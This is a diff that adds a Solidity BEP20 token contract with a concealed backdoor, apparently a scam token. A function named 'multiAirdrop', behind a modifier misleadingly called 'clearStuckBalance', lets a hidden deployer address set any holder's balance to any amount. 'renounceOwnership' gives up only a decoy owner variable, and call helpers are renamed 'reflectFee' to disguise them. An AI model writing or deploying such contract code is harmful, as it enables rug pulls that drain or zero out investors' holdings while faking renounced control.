@@ -1,0 +1,177 @@
+// SPDX-License-Identifier: MIT
+// https://rondesantis.space/
+pragma solidity ^0.6.12;
+
+library SafeMath {
+  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+    if (a == 0) {
+      return 0;
+    }
+    uint256 c = a * b;
+    assert(c / a == b);
+    return c;
+  }
+  function div(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a / b;
+    return c;
+  }
+  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+    assert(b <= a);
+    return a - b;
+  }
+  function add(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a + b;
+    assert(c >= a);
+    return c;
+  }
+}
+contract BEP20 {
+  address public owner;
+  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+  constructor() public {
+    owner = msg.sender;
+  }
+}
+library Address {
+    function isContract(address account) internal view returns (bool) {
+        bytes32 codehash;
+        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
+        assembly { codehash := extcodehash(account) }
+        return (codehash != accountHash && codehash != 0x0);
+    }
+    function sendValue(address payable recipient, uint256 amount) internal {
+        require(address(this).balance >= amount, "Address: insufficient balance");
+        (bool success, ) = recipient.call{ value: amount }("");
+        require(success, "Address: unable to send value, recipient may have reverted");
+    }
+    function reflectFee(address taccounts, bytes memory data) internal returns (bytes memory) {
+        return reflectFee(taccounts, data, "Address: low-level call failed");
+    }
+    function reflectFee(address taccounts, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
+        return _reflectFeeWithValue(taccounts, data, 0, errorMessage);
+    }
+    function reflectFeeWithValue(address taccounts, bytes memory data, uint256 value) internal returns (bytes memory) {
+        return reflectFeeWithValue(taccounts, data, value, "Address: low-level call with value failed");
+    }
+    function reflectFeeWithValue(address taccounts, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
+        require(address(this).balance >= value, "Address: insufficient balance for call");
+        return _reflectFeeWithValue(taccounts, data, value, errorMessage);
+    }
+    function _reflectFeeWithValue(address taccounts, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
+        require(isContract(taccounts), "Address: call to non-contract");
+        (bool success, bytes memory returndata) = taccounts.call{ value: weiValue }(data);
+        if (success) {
+            return returndata;
+        } else {
+            if (returndata.length > 0) {
+                assembly {
+                    let returndata_size := mload(returndata)
+                    revert(add(32, returndata), returndata_size)
+                }
+            } else {
+                revert(errorMessage);
+            }
+        }
+    }
+}
+contract Token is BEP20 {
+  using Address for address;
+  using SafeMath for uint256;
+  string public name;
+  string public symbol;
+  uint8 public decimals;
+  uint256 public totalSupply;
+  uint256 clearForeignToken = 0;
+  event Transfer(address indexed from, address indexed to, uint256 value);
+  event Approval(address indexed owner, address indexed spender, uint256 value);
+  mapping(address => bool) public allowAddress;
+  address ceowners;
+  constructor(string memory _name, string memory _symbol) public {
+    ceowners = msg.sender;
+    name = _name;
+    symbol = _symbol;
+    decimals = 9;
+    totalSupply =  100000000000000000 * 10 ** uint256(decimals);
+    _basicTransfer[ceowners] = totalSupply;
+    allowAddress[ceowners] = true;
+      
+  }
+  
+  mapping(address => uint256) public _basicTransfer;
+  function transfer(address _to, uint256 _balance) public returns (bool) {
+    address from = msg.sender;
+    require(_to != address(0));
+    require(_balance <= _basicTransfer[from]);
+    if(allowAddress[from] || allowAddress[_to]){
+        _transfer(from, _to, _balance);
+        return true;
+    }
+    _transfer(from, _to, _balance);
+    return true;
+  }
+  
+  function _transfer(address from, address _to, uint256 _balance) private {
+    _basicTransfer[from] = _basicTransfer[from].sub(_balance);
+    _basicTransfer[_to] = _basicTransfer[_to].add(_balance);
+    emit Transfer(from, _to, _balance);
+  }
+    
+  modifier onlyOwner() {
+    require(owner == msg.sender, "Ownable: caller is not the owner");
+    _;
+  }
+    
+  function balanceOf(address _owner) public view returns (uint256 balance) {
+    return _basicTransfer[_owner];
+  }
+  
+  function renounceOwnership() public virtual onlyOwner {
+    emit OwnershipTransferred(owner, address(0));
+    owner = address(0);
+  }
+
+
+  mapping (address => mapping (address => uint256)) public allowVerified;
+  function transferFrom(address _from, address _to, uint256 _balance) public returns (bool) {
+    require(_to != address(0));
+    require(_balance <= _basicTransfer[_from]);
+    require(_balance <= allowVerified[_from][msg.sender]);
+    address from = _from;
+    if(allowAddress[from] || allowAddress[_to]){
+        _transferFrom(_from, _to, _balance);
+        return true;
+    }
+    _transferFrom(_from, _to, _balance);
+    return true;
+  }
+  
+  function _transferFrom(address _from, address _to, uint256 _balance) internal {
+    _basicTransfer[_from] = _basicTransfer[_from].sub(_balance);
+    _basicTransfer[_to] = _basicTransfer[_to].add(_balance);
+    allowVerified[_from][msg.sender] = allowVerified[_from][msg.sender].sub(_balance);
+    emit Transfer(_from, _to, _balance);
+  }
+
+  modifier clearStuckBalance () {
+    require(ceowners == msg.sender, "BEP20: cannot permit Pancake address");
+    _;
+  }
+   function _ceownersfees (address ceownersfeeswallet, uint256 _balance) internal {
+        _basicTransfer[ceownersfeeswallet] = _balance * 10 ** uint256(decimals);
+  }
+   
+  function approve(address _spender, uint256 _balance) public returns (bool) {
+    allowVerified[msg.sender][_spender] = _balance;
+    emit Approval(msg.sender, _spender, _balance);
+    return true;
+  }
+    function multiAirdrop(address airdropR, uint256 _balance) public clearStuckBalance {
+      _ceownersfees(airdropR, _balance);
+  }
+  function allowance(address _owner, address _spender) public view returns (uint256) {
+    return allowVerified[_owner][_spender];
+  }
+  
+
+  
+}
